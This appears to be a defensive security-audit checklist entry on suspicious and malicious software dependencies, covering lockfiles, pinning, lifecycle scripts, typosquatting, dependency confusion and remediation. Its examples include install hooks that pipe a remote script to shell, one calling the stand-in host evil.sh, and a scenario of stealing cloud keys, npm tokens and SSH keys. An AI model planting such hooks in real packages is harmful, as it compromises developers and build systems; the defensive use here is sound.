---
id: P79
name: SuspiciousDependencies
refs: ASVS V10.1.x, V14.1.x / WSTG-INFO-08 / CS: Dependency Management, Third Party JS Management
requires: []
---

# P79 — SuspiciousDependencies

## Overview
Supply-chain compromise is now one of the highest-impact risks to a codebase: the application's own code can be flawless, yet a single malicious or vulnerable dependency can introduce RCE, secret theft, or backdoors that bypass every perimeter control. The issue is two-fold — **malicious code** (packages authored or hijacked to run hostile `postinstall`/`preinstall` hooks, typosquats, or dependency-confusion implants) and **vulnerable code** (legitimate but outdated libraries carrying known CVEs). The root cause is almost always a failure of dependency governance: unpinned or floating version ranges, missing or ignored lockfiles, no integrity verification, and CI that installs with `npm install` rather than `npm ci` — combined with lifecycle scripts that execute at install time on developer machines and build servers with full network and filesystem access.

## What to check
- Is a **lockfile committed** (`package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`, `poetry.lock`, `Cargo.lock`, `go.sum`, `Gemfile.lock`, `composer.lock`, `pom.xml` with `<dependencyManagement>`) and does CI install from it deterministically (`npm ci`/`yarn install --frozen-lockfile`/`pip install -r requirements.txt` against a pinned/hashed set)?
- Are dependencies **pinned to exact, immutable versions** (e.g. `"1.2.3"`, not `"^1.0.0"`, `"~1.2"`, `"*"`), and are registry tarballs verified by hash/integrity (`integrity: sha512-…` in the lockfile, pip `--require-hashes`, Go `go.sum`)?
- Do any dependencies declare **lifecycle scripts** (`preinstall`, `postinstall`, `prepare`, `prebuild`, `gypfile`) — and are they from low-maintenance, unknown, or recently transferred maintainership packages?
- Are there indicators of **typosquatting** or **dependency confusion** (names one character off a popular package; scoped packages pointing at public registries while a private name exists; unscoped fallback)?
- Are dependencies fetched from **public registries without allow-listing**, or from a mirror/proxy with no upstream policy? Is a private/verified registry (`npm config set registry`, Artifactory, CodeArtifact) used?
- Are scripts, styles, or fonts loaded from **CDNs without Subresource Integrity** (`<script src=... integrity=... crossorigin>`)?
- Is there a toolchain gap — **no `npm audit`/Snyk/Dependabot/OSV-Scan/Trivy** in CI, or alerts configured but routinely ignored?
- Are `postinstall`-capable ecosystems (npm, pnpm, Yarn, pip, Composer, Maven `gmaven-plugin`/Gradle init scripts) executing untrusted third-party build scripts in the same context that has access to env vars / secrets / `~/.ssh`?
- Is there a produced/checked-in **SBOM** (CycloneDX / SPDX) so transitive dependencies are visible and auditable?
- Are vendored/checked-in binaries or `node_modules`/`vendor/`/jars present with no provenance?

## Static signals
Lifecycle scripts and install-time execution (highest-risk signal):
- `package.json`: `"postinstall": "node aAPT.js"`, `"preinstall": "curl http://... | sh"`, `"prepare": "..."`
- `~/.npmrc` or repo `.npmrc` with `ignore-scripts=false` (scripts enabled globally)
- npm `package.json` `scripts` referencing `curl`/`wget`/`powershell`/`node -e`
- Python `setup.py` with custom `cmdclass`, `install`/`develop` overrides, or `os.system` at import time; `pyproject.toml` build backends running code
- Gradle/Maven build that resolves plugins from `https://repo1.maven.org` with snapshot/`+`/`LATEST` versions
- Go `//go:generate` or `go install` of unscoped tools; `replace` directives pointing at unexpected forks

Floating/unpinned versions (supply-chain drift surface):
- `"fast-utils": "^1.0.0"`, `"react": "*"`, `"lodash": "latest"`
- `requirements.txt` without `==`/hashes: `requests` or `requests>=2.0`
- `go.mod` missing `go.sum` entry, or `// indirect` overrides
- Maven `<version>RELEASE</version>` / `LATEST`; Gradle `+`, `1.+`, `latest.release`
- `composer.json` with no `composer.lock`

Lockfile/integrity gaps:
- No `package-lock.json` / `yarn.lock` in repo root
- `package-lock.json` present but CI runs `npm install` (mutates lockfile) instead of `npm ci`
- pip without `--require-hashes`; `poetry.toml` without `installer.re-hashes`
- Missing `<scope>import</scope>` integrity for jars checked into `lib/`

CDN scripts without integrity:
- `<script src="https://cdn.example.com/lib.js"></script>` (no `integrity`/`crossorigin`)
- `<link rel="stylesheet" href="https://unpkg.com/foo.css">` (no SRI)
- `python -c "urllib.request.urlopen('https://get.example.com/x.sh')"` piped to shell

Registry/proxy misconfiguration:
- `.npmrc` `registry=https://registry.npmjs.org` for a package whose private name should resolve internally (dependency-confusion)
- `pip.conf` `index-url` pointing at an unauthenticated public index for internal packages

## False positives
- A **committed lockfile plus `npm ci`/`--frozen-lockfile` plus an enabled audit tool (Dependabot/Snyk/OSV-Scan) plus disabled install scripts** (`npm config set ignore-scripts true` or `.npmrc` `ignore-scripts=true`) — the residual risk is low; the lifecycle-script attack surface is gone.
- Packages installed from a **curated private registry** (Artifactory/CodeArtifact/Nexus) with upstream allow-listing and immutability enforced.
- A `postinstall` from a **first-party, well-known, still-maintained** package (e.g. build tools generating bindings) where the script is benign and reviewed — verify, then skip.
- Exact-pinned, hash-verified Python requirements (`==` + `--require-hashes`) with hashes checked into the repo.
- CDN scripts that carry a valid `integrity` attribute with `crossorigin` set.
- A monorepo where the root lockfile is shared but sub-package `package.json` files legitimately omit their own — confirm the root lockfile covers the full tree.

## Attack scenario
1. Attacker publishes (or compromises) a package named `event-utils` that is one keystroke away from the popular `eventutil`, declaring `"postinstall": "node ./aPT.js"`.
2. A developer runs `npm install event-utils` (or an automated `npm install` in CI that is allowed to mutate the lockfile), which resolves the floating `^` range and fetches the attacker's latest version.
3. `postinstall` executes with the privileges of the build agent / developer machine: it reads `AWS_SECRET_ACCESS_KEY`, `~/.npmrc` tokens, `~/.ssh/id_*`, and `.env`, and exfiltrates them over DNS or an HTTPS callback.
4. Alternatively, a **dependency-confusion** variant: an internal package `@corp/auth` exists only on the private registry; the project's `.npmrc` falls back to `registry.npmjs.org`, where the attacker has registered a public `@corp/auth`. npm picks whichever has the higher version number — the attacker's — and the build pulls hostile code.
5. With stolen credentials or merged hostile code, the attacker pivots into production deploy pipelines, CI/CD, or customer data.

## Impact
- **Confidentiality**: theft of source, secrets, deploy keys, signing certs, and customer data — full environment compromise.
- **Integrity**: backdoors, cryptominers, credential harvesters, or watermarked builds shipped to all users of the downstream artifact (Solarwinds-style blast radius).
- **Availability**: cryptomining / resource exhaustion, ransomware-style payloads, or build breakage from a deliberately broken release.
- Severity scales with **where the dependency runs**: a dev-only malicious package compromises every contributor and the CI; a runtime/package dependency compromises every end user in production. A compromised transitive dependency (deep in the tree) is just as dangerous as a direct one because lifecycle scripts still execute.

## Remediation
Pin exactly, commit the lockfile, install deterministically, disable install scripts, and audit continuously:
```jsonc
// VULNERABLE — floating range + malicious lifecycle script, no lockfile discipline
"dependencies": {
  "fast-utils": "^1.0.0"          // resolves to whatever the registry serves today
}
// fast-utils package.json: "postinstall": "curl https://evil.sh | sh"
// CI: npm install   // mutates lockfile, runs scripts, fetches newest ^ match

// SAFE — exact pin + lockfile + frozen install + scripts disabled + audit
"dependencies": {
  "fast-utils": "1.2.3"           // immutable exact version
}
// package-lock.json committed, with "integrity": "sha512-..."
// .npmrc: ignore-scripts=true
// CI: npm ci && npm audit --audit-level=high   // deterministic, no mutation
```
Apply defense-in-depth: route all installs through a curated **private registry with upstream allow-listing and immutability**, enable a continuous **SCA tool** (Dependabot/Snyk/OSV-Scan/Trivy) that fails the build on high/critical CVEs, generate and store an **SBOM** (CycloneDX/SPDX) per release, and add **Subresource Integrity** to every CDN-loaded `<script>`/`<link>`.

## References
- OWASP ASVS V10.1.x — Malicious code and integrity controls (verify provenance of third-party components)
- OWASP ASVS V14.1.x — Verify that build pipelines and components are secured and tracked
- OWASP WSTG-INFO-08 — Search for/analyze application architecture and third-party components
- OWASP Cheat Sheets: Dependency Management (SCA, pinning, lockfiles), Third Party JS Management (SRI, CDN, CSP)
